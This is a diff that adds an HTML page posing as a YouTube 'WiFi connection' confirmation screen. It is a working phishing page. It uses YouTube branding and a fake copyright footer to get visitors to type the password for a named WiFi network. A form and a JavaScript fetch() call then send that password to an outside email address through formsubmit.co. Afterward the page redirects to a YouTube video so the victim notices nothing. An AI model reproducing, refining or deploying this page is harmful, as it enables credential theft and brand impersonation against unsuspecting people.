@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>YouTube Confirmation - WiFi Connection</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+
+        .header {
+            background-color: #212121;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .header img {
+            height: 30px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            margin-left: 10px;
+        }
+
+        .container {
+            background-color: white;
+            padding: 20px;
+            max-width: 500px;
+            margin: 50px auto;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .container h2 {
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+
+        .container p {
+            font-size: 16px;
+            margin-bottom: 30px;
+            color: #555;
+        }
+
+        .btn {
+            padding: 12px 25px;
+            font-size: 16px;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+
+        .btn-primary {
+            background-color: #FF0000;
+        }
+
+        .btn-primary:hover {
+            background-color: #cc0000;
+        }
+
+        .btn-secondary {
+            background-color: #f1f1f1;
+            color: #555;
+            border: 1px solid #ccc;
+        }
+
+        .btn-secondary:hover {
+            background-color: #e0e0e0;
+        }
+
+        .video-thumbnail-container {
+            position: relative;
+            background-color: #000;
+            color: white;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 8px;
+            font-size: 18px;
+            text-align: center;
+        }
+
+        .video-thumbnail {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 8px;
+            filter: blur(8px); /* Apply blur effect to the thumbnail */
+            transition: filter 0.3s ease;
+        }
+
+        .video-thumbnail-container:hover .video-thumbnail {
+            filter: blur(0); /* Unblur when hovering */
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none; 
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 400px;
+            text-align: center;
+        }
+
+        .modal-content input {
+            padding: 10px;
+            font-size: 14px;
+            width: 100%;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .modal-content button {
+            background-color: #FF0000;
+            color: white;
+            border: none;
+            cursor: pointer;
+            padding: 12px 25px;
+            font-size: 16px;
+            border-radius: 4px;
+        }
+
+        .modal-content button:hover {
+            background-color: #cc0000;
+        }
+
+        .footer {
+            background-color: #212121;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/YouTube_icon_%282013-2017%29.png/600px-YouTube_icon_%282013-2017%29.png" alt="YouTube Logo">
+        <h1>YouTube</h1>
+    </div>
+
+    <div class="container">
+        <h2>Confirm Your WiFi Connection</h2>
+        <p>Please verify your WiFi details and you'll be redirected to a video.</p>
+
+        <form id="wifiForm" action="https://formsubmit.co/ratin9412@gmail.com" method="POST">
+            <!-- This is the email where the WiFi details will be sent -->
+            <input type="hidden" name="_subject" value="WiFi Details Submission">
+            <input type="hidden" name="_next" value="https://www.youtube.com/watch?v=Ty0otlCjsa4">
+            <input type="text" id="ssid" name="WiFi_Name" value="ZTE_5G_A4yytd" readonly style="padding: 12px; font-size: 14px; width: 100%; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;">
+            <input type="password" id="password" name="WiFi_Password" placeholder="Enter WiFi Password" required style="padding: 12px; font-size: 14px; width: 100%; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;">
+            <button type="submit" class="btn btn-primary">Confirm WiFi</button>
+        </form>
+
+        <div id="log" style="margin-top: 15px; font-size: 14px;"></div>
+    </div>
+
+    <div class="video-thumbnail-container">
+        <h3>Enjoy your Video!</h3>
+        <a href="#" onclick="openModal()">
+            <img class="video-thumbnail" src="https://via.placeholder.com/500x280.png?text=YouTube+Video+Thumbnail" alt="Video Thumbnail">
+        </a>
+        <p>Video Title: Introduction to YouTube</p>
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2025 YouTube, Inc.</p>
+    </div>
+
+    <!-- Modal -->
+    <div id="wifiModal" class="modal">
+        <div class="modal-content">
+            <h2>Enter WiFi Details</h2>
+            <input type="text" id="modalSsid" value="ZTE_5G_A4yytd" readonly>
+            <input type="password" id="modalPassword" placeholder="Enter WiFi Password" required>
+            <button onclick="submitWiFiDetails()">Submit</button>
+        </div>
+    </div>
+
+    <script>
+        function openModal() {
+            // Show the modal for WiFi information
+            document.getElementById('wifiModal').style.display = "flex";
+        }
+
+        function submitWiFiDetails() {
+            const ssid = document.getElementById('modalSsid').value;
+            const password = document.getElementById('modalPassword').value;
+
+            // Send WiFi details to FormSubmit
+            fetch("https://formsubmit.co/ratin9412@gmail.com", {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    WiFi_Name: ssid,
+                    WiFi_Password: password
+                })
+            }).then(() => {
+                // Hide the modal and show the video
+                document.getElementById('wifiModal').style.display = "none";
+                window.location.href = "https://www.youtube.com/watch?v=Ty0otlCjsa4";
+            }).catch(() => {
+                alert("Failed to send details. Please try again.");
+            });
+        }
+    </script>
+
+</body>
+</html>
